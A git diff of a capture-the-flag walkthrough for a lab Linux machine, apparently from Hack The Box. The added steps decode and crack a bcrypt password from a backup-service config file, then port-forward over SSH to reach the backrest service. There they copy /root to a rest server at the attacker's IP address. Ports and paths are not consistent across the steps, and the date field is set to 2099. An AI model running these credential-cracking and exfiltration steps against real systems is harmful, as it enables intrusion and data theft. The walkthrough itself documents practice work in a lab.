@@ -4,9 +4,9 @@ difficulty: easy
 os: linux
 platform: htb
 date: 2025/07/01
-releasedDate: 2025-07-01
+releasedDate: 2099-12-31
 userFlag: true
-rootFlag: false
+rootFlag: true
 
 img: https://labs.hackthebox.com/storage/avatars/e6633d6c2b1d824c3756eb21aeed7590.png
 ---
@@ -167,58 +167,79 @@ In `backrest/.config/backrest/config.json` we find the following content:
 }
 ```
 
+This Bcrypt password is coded in base64. We can decode it to get the actual Bcrypt hash:
+```bash
+echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
+```
+```
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
+```
+
 Bcrypt is an algorithm used for hashing passwords. The password for the user `backrest_root` is hashed using bcrypt. We can use a tool like `hashcat` or `john the ripper` to crack the password.
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt bcrypt.hash
+hashcat -m 3200 password.txt /usr/share/wordlists/rockyou.txt
 ```
 ```
-Using default input encoding: UTF-8
-
-
-
-
-  38   │ [Service]
-  39   │ Type=simple
-  40   │ User=$(whoami)
-  41   │ Group=$(whoami)
-  42   │ ExecStart=/usr/local/bin/backrest
-  43   │ Environment="BACKREST_PORT=127.0.0.1:9898"
-  44   │ Environment="BACKREST_CONFIG=/opt/backrest/.config/backrest/config.json"
-  45   │ Environment="BACKREST_DATA=/opt/backrest"
-  46   │ Environment="BACKREST_RESTIC_COMMAND=/opt/backrest/restic"
-
- 110   │ echo "Logs are available at ~/.local/share/backrest/processlogs/backrest.log"
-
- .config/backrest/config.json:10:        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
 ```
 
-
-
-
-
-
-### Results
-
-```
-/usr/bin/suid_binary
-```
-
-### Exploiting the SUID Binary
-
-We can exploit the SUID binary to gain root access. Assuming the binary is vulnerable, we can run it with root privileges:
-
+We find that there is a backrest service running on internal port 9898. We can use `ssh` to port forward this port to our local machine:
 ```bash
-/usr/bin/suid_binary
+ssh -L 9898:localhost:9898 gael@artificial.htb
 ```
 
-### Root Flag
+Now we can access the backrest service on our local machine at `http://localhost:9898`.
+We can log in using the credentials `backrest_root:!@#$%^`.
 
-After successfully exploiting the SUID binary, we can find the root flag:
 
+Create a new repo in the backrest service connecting it to a local rest service.
+Create a plan which copies `/root` to the remote repo.
+
+We create a initialize rest server:
 ```bash
-cat /root/root.txt
+RPORT=12345
+NAME=backup_name
+./rest-server --listen ":$RPORT"
+```
+
+We create a new repository in the local rest server:
+```bash
+restic init -r "rest:http://localhost:$RPORT/$NAME"
+```
+
+We create a new repository in the backrest service:
+```
+Repo Name: backup
+Repository URL -> rest:http://10.10.14.175:9321/backup
+Password: wak
+```
+
+We create a plan in the backrest service:
+```
+Plan Name: backup
+Repository: backup
+Path: /root
+```
+
+We run the plan to copy the `/root` directory to the remote repository:
+```
+Backup Now
+```
+
+When the backup is complete, we can check the contents of the local rest repository:
+```bash
+restic restore -r "/tmp/restic/backup" latest --target .
+```
+
+We enter the password `wak` when prompted. This will restore the contents of the `/root` directory to the current directory.
+
+We can now read the root flag:
+```bash
+cat root/root.txt
+```
+```
+root flag value
 ```
 
 ## Conclusion
 
-Congratulations! You have successfully completed the walkthrough for the example machine. You have learned how to enumerate services, exploit vulnerabilities, and retrieve both user and root flags.
